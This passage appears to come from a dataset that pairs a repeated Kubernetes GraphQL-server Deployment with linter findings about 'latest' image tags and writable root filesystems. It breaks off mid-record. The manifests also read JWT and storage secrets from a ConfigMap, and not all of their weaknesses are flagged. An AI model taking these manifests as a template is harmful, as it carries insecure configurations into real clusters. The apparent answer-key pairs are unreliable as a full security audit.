    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: graphql-server-deployment\n  namespace: hm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: graphql-server\n  template:\n    metadata:\n      labels:\n        component: graphql-server\n    spec:\n      containers:\n      - name: graphql-server\n        image: hongbomiao/hm-graphql-server:latest\n        env:\n        - name: APP_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: app_env\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: port\n        - name: GRPC_SERVER_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_host\n        - name: GRPC_SERVER_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_port\n        - name: OPA_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_host\n        - name: OPA_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_port\n        - name: DGRAPH_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_host\n        - name: DGRAPH_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_grpc_port\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_port\n        - name: REDIS_DB\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_db\n        - name: MINIO_ENDPOINT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_endpoint\n        - name: MINIO_ACCESS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_access_key_id\n        - name: MINIO_SECRET_ACCESS_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_secret_access_key\n        - name: TORCH_SERVE_GRPC_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_host\n        - name: TORCH_SERVE_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_port\n        - name: OPEN_CENSUS_AGENT_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_host\n        - name: OPEN_CENSUS_AGENT_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_port\n        - name: JAEGER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jaeger_url\n        - name: JWT_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jwt_secret\n        - name: ELASTIC_APM_SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: elastic_apm_service_name\n        - name: ELASTIC_APM_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_url\n        - name: ELASTIC_APM_ENVIRONMENT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_environment\n        - name: ELASTIC_APM_SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-elastic-apm\n              key: token\n        - name: ELASTIC_APM_VERIFY_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_verify_server_cert\n        - name: ELASTIC_APM_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_cert\n        - name: ELASTIC_APM_LOG_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_level\n        - name: ELASTIC_APM_LOG_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_file\n        ports:\n        - name: graphql-server\n          protocol: TCP\n          containerPort: 31800\n        volumeMounts:\n        - mountPath: /data/elastic-apm\n          name: elastic-apm-volume\n      - name: opal-client\n        image: hongbomiao/hm-opal-client:latest\n        env:\n        - name: OPAL_CLIENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-opal-client-secret\n              key: opal_client_token\n        - name: OPAL_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_server_url\n        - name: OPAL_FETCH_PROVIDER_MODULES\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_fetch_provider_modules\n        - name: OPAL_INLINE_OPA_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_config\n        - name: OPAL_INLINE_OPA_LOG_FORMAT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_log_format\n        - name: OPAL_LOG_MODULE_EXCLUDE_LIST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_module_exclude_list\n        - name: OPAL_LOG_COLORIZE\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_colorize\n        ports:\n        - name: opal-client\n          protocol: TCP\n          containerPort: 7000\n        - name: opa\n          protocol: TCP\n          containerPort: 8181\n        volumeMounts:\n        - mountPath: /data/opa\n          name: opa-volume\n      volumes:\n      - name: elastic-apm-volume\n        persistentVolumeClaim:\n          claimName: elastic-apm-pvc\n      - name: opa-volume\n        persistentVolumeClaim:\n          claimName: opa-pvc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"graphql-server\" is using an invalid container image, \"hongbomiao/hm-graphql-server:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2685",
    "manifest_path": "data/manifests/the_stack_sample/sample_0747.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: graphql-server-deployment\n  namespace: hm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: graphql-server\n  template:\n    metadata:\n      labels:\n        component: graphql-server\n    spec:\n      containers:\n      - name: graphql-server\n        image: hongbomiao/hm-graphql-server:latest\n        env:\n        - name: APP_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: app_env\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: port\n        - name: GRPC_SERVER_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_host\n        - name: GRPC_SERVER_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_port\n        - name: OPA_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_host\n        - name: OPA_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_port\n        - name: DGRAPH_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_host\n        - name: DGRAPH_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_grpc_port\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_port\n        - name: REDIS_DB\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_db\n        - name: MINIO_ENDPOINT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_endpoint\n        - name: MINIO_ACCESS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_access_key_id\n        - name: MINIO_SECRET_ACCESS_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_secret_access_key\n        - name: TORCH_SERVE_GRPC_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_host\n        - name: TORCH_SERVE_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_port\n        - name: OPEN_CENSUS_AGENT_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_host\n        - name: OPEN_CENSUS_AGENT_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_port\n        - name: JAEGER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jaeger_url\n        - name: JWT_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jwt_secret\n        - name: ELASTIC_APM_SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: elastic_apm_service_name\n        - name: ELASTIC_APM_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_url\n        - name: ELASTIC_APM_ENVIRONMENT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_environment\n        - name: ELASTIC_APM_SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-elastic-apm\n              key: token\n        - name: ELASTIC_APM_VERIFY_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_verify_server_cert\n        - name: ELASTIC_APM_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_cert\n        - name: ELASTIC_APM_LOG_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_level\n        - name: ELASTIC_APM_LOG_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_file\n        ports:\n        - name: graphql-server\n          protocol: TCP\n          containerPort: 31800\n        volumeMounts:\n        - mountPath: /data/elastic-apm\n          name: elastic-apm-volume\n      - name: opal-client\n        image: hongbomiao/hm-opal-client:latest\n        env:\n        - name: OPAL_CLIENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-opal-client-secret\n              key: opal_client_token\n        - name: OPAL_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_server_url\n        - name: OPAL_FETCH_PROVIDER_MODULES\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_fetch_provider_modules\n        - name: OPAL_INLINE_OPA_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_config\n        - name: OPAL_INLINE_OPA_LOG_FORMAT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_log_format\n        - name: OPAL_LOG_MODULE_EXCLUDE_LIST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_module_exclude_list\n        - name: OPAL_LOG_COLORIZE\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_colorize\n        ports:\n        - name: opal-client\n          protocol: TCP\n          containerPort: 7000\n        - name: opa\n          protocol: TCP\n          containerPort: 8181\n        volumeMounts:\n        - mountPath: /data/opa\n          name: opa-volume\n      volumes:\n      - name: elastic-apm-volume\n        persistentVolumeClaim:\n          claimName: elastic-apm-pvc\n      - name: opa-volume\n        persistentVolumeClaim:\n          claimName: opa-pvc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"opal-client\" is using an invalid container image, \"hongbomiao/hm-opal-client:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2686",
    "manifest_path": "data/manifests/the_stack_sample/sample_0747.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: graphql-server-deployment\n  namespace: hm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: graphql-server\n  template:\n    metadata:\n      labels:\n        component: graphql-server\n    spec:\n      containers:\n      - name: graphql-server\n        image: hongbomiao/hm-graphql-server:latest\n        env:\n        - name: APP_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: app_env\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: port\n        - name: GRPC_SERVER_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_host\n        - name: GRPC_SERVER_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_port\n        - name: OPA_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_host\n        - name: OPA_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_port\n        - name: DGRAPH_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_host\n        - name: DGRAPH_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_grpc_port\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_port\n        - name: REDIS_DB\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_db\n        - name: MINIO_ENDPOINT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_endpoint\n        - name: MINIO_ACCESS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_access_key_id\n        - name: MINIO_SECRET_ACCESS_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_secret_access_key\n        - name: TORCH_SERVE_GRPC_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_host\n        - name: TORCH_SERVE_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_port\n        - name: OPEN_CENSUS_AGENT_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_host\n        - name: OPEN_CENSUS_AGENT_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_port\n        - name: JAEGER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jaeger_url\n        - name: JWT_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jwt_secret\n        - name: ELASTIC_APM_SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: elastic_apm_service_name\n        - name: ELASTIC_APM_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_url\n        - name: ELASTIC_APM_ENVIRONMENT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_environment\n        - name: ELASTIC_APM_SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-elastic-apm\n              key: token\n        - name: ELASTIC_APM_VERIFY_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_verify_server_cert\n        - name: ELASTIC_APM_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_cert\n        - name: ELASTIC_APM_LOG_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_level\n        - name: ELASTIC_APM_LOG_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_file\n        ports:\n        - name: graphql-server\n          protocol: TCP\n          containerPort: 31800\n        volumeMounts:\n        - mountPath: /data/elastic-apm\n          name: elastic-apm-volume\n      - name: opal-client\n        image: hongbomiao/hm-opal-client:latest\n        env:\n        - name: OPAL_CLIENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-opal-client-secret\n              key: opal_client_token\n        - name: OPAL_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_server_url\n        - name: OPAL_FETCH_PROVIDER_MODULES\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_fetch_provider_modules\n        - name: OPAL_INLINE_OPA_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_config\n        - name: OPAL_INLINE_OPA_LOG_FORMAT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_log_format\n        - name: OPAL_LOG_MODULE_EXCLUDE_LIST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_module_exclude_list\n        - name: OPAL_LOG_COLORIZE\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_colorize\n        ports:\n        - name: opal-client\n          protocol: TCP\n          containerPort: 7000\n        - name: opa\n          protocol: TCP\n          containerPort: 8181\n        volumeMounts:\n        - mountPath: /data/opa\n          name: opa-volume\n      volumes:\n      - name: elastic-apm-volume\n        persistentVolumeClaim:\n          claimName: elastic-apm-pvc\n      - name: opa-volume\n        persistentVolumeClaim:\n          claimName: opa-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"graphql-server\" does not have a read-only root file system"
  },
  {
    "id": "2687",
    "manifest_path": "data/manifests/the_stack_sample/sample_0747.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: graphql-server-deployment\n  namespace: hm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: graphql-server\n  template:\n    metadata:\n      labels:\n        component: graphql-server\n    spec:\n      containers:\n      - name: graphql-server\n        image: hongbomiao/hm-graphql-server:latest\n        env:\n        - name: APP_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: app_env\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: port\n        - name: GRPC_SERVER_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_host\n        - name: GRPC_SERVER_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_port\n        - name: OPA_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_host\n        - name: OPA_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_port\n        - name: DGRAPH_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_host\n        - name: DGRAPH_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_grpc_port\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_port\n        - name: REDIS_DB\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_db\n        - name: MINIO_ENDPOINT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_endpoint\n        - name: MINIO_ACCESS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_access_key_id\n        - name: MINIO_SECRET_ACCESS_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_secret_access_key\n        - name: TORCH_SERVE_GRPC_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_host\n        - name: TORCH_SERVE_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_port\n        - name: OPEN_CENSUS_AGENT_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_host\n        - name: OPEN_CENSUS_AGENT_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_port\n        - name: JAEGER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jaeger_url\n        - name: JWT_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jwt_secret\n        - name: ELASTIC_APM_SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: elastic_apm_service_name\n        - name: ELASTIC_APM_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_url\n        - name: ELASTIC_APM_ENVIRONMENT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_environment\n        - name: ELASTIC_APM_SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-elastic-apm\n              key: token\n        - name: ELASTIC_APM_VERIFY_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_verify_server_cert\n        - name: ELASTIC_APM_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_cert\n        - name: ELASTIC_APM_LOG_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_level\n        - name: ELASTIC_APM_LOG_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_file\n        ports:\n        - name: graphql-server\n          protocol: TCP\n          containerPort: 31800\n        volumeMounts:\n        - mountPath: /data/elastic-apm\n          name: elastic-apm-volume\n      - name: opal-client\n        image: hongbomiao/hm-opal-client:latest\n        env:\n        - name: OPAL_CLIENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-opal-client-secret\n              key: opal_client_token\n        - name: OPAL_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_server_url\n        - name: OPAL_FETCH_PROVIDER_MODULES\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_fetch_provider_modules\n        - name: OPAL_INLINE_OPA_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_config\n        - name: OPAL_INLINE_OPA_LOG_FORMAT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_log_format\n        - name: OPAL_LOG_MODULE_EXCLUDE_LIST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_module_exclude_list\n        - name: OPAL_LOG_COLORIZE\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_colorize\n        ports:\n        - name: opal-client\n          protocol: TCP\n          containerPort: 7000\n        - name: opa\n          protocol: TCP\n          containerPort: 8181\n        volumeMounts:\n        - mountPath: /data/opa\n          name: opa-volume\n      volumes:\n      - name: elastic-apm-volume\n        persistentVolumeClaim:\n          claimName: elastic-apm-pvc\n      - name: opa-volume\n        persistentVolumeClaim:\n          claimName: opa-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"opal-client\" does not have a read-only root file system"
  },
  {
    "id": "2688",
    "manifest_path": "data/manifests/the_stack_sample/sample_0747.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: graphql-server-deployment\n  namespace: hm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: graphql-server\n  template:\n    metadata:\n      labels:\n        component: graphql-server\n    spec:\n      containers:\n      - name: graphql-server\n        image: hongbomiao/hm-graphql-server:latest\n        env:\n        - name: APP_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: app_env\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: port\n        - name: GRPC_SERVER_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_host\n        - name: GRPC_SERVER_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: grpc_server_port\n        - name: OPA_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_host\n        - name: OPA_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opa_port\n        - name: DGRAPH_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_host\n        - name: DGRAPH_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: dgraph_grpc_port\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_port\n        - name: REDIS_DB\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: redis_db\n        - name: MINIO_ENDPOINT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_endpoint\n        - name: MINIO_ACCESS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_access_key_id\n        - name: MINIO_SECRET_ACCESS_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: minio_secret_access_key\n        - name: TORCH_SERVE_GRPC_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_host\n        - name: TORCH_SERVE_GRPC_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: torch_serve_grpc_port\n        - name: OPEN_CENSUS_AGENT_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_host\n        - name: OPEN_CENSUS_AGENT_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: open_census_agent_port\n        - name: JAEGER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jaeger_url\n        - name: JWT_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: jwt_secret\n        - name: ELASTIC_APM_SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: elastic_apm_service_name\n        - name: ELASTIC_APM_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_url\n        - name: ELASTIC_APM_ENVIRONMENT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_environment\n        - name: ELASTIC_APM_SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-elastic-apm\n              key: token\n        - name: ELASTIC_APM_VERIFY_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_verify_server_cert\n        - name: ELASTIC_APM_SERVER_CERT\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_server_cert\n        - name: ELASTIC_APM_LOG_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_level\n        - name: ELASTIC_APM_LOG_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: elastic-apm-configmap\n              key: elastic_apm_log_file\n        ports:\n        - name: graphql-server\n          protocol: TCP\n          containerPort: 31800\n        volumeMounts:\n        - mountPath: /data/elastic-apm\n          name: elastic-apm-volume\n      - name: opal-client\n        image: hongbomiao/hm-opal-client:latest\n        env:\n        - name: OPAL_CLIENT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: hm-opal-client-secret\n              key: opal_client_token\n        - name: OPAL_SERVER_URL\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_server_url\n        - name: OPAL_FETCH_PROVIDER_MODULES\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_fetch_provider_modules\n        - name: OPAL_INLINE_OPA_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_config\n        - name: OPAL_INLINE_OPA_LOG_FORMAT\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_inline_opa_log_format\n        - name: OPAL_LOG_MODULE_EXCLUDE_LIST\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_module_exclude_list\n        - name: OPAL_LOG_COLORIZE\n          valueFrom:\n            configMapKeyRef:\n              name: graphql-server-configmap\n              key: opal_log_colorize\n        ports:\n        - name: opal-client\n          protocol: TCP\n          containerPort: 7000\n        - name: opa\n          protocol: TCP\n          containerPort: 8181\n        volumeMounts:\n        - mountPath: /data/opa\n          name: opa-volume\n      volumes:\n      - name: elastic-apm-volume\n        persistentVolumeClaim:\n          claimName: elastic-apm-pvc\n      - name: opa-volume\n        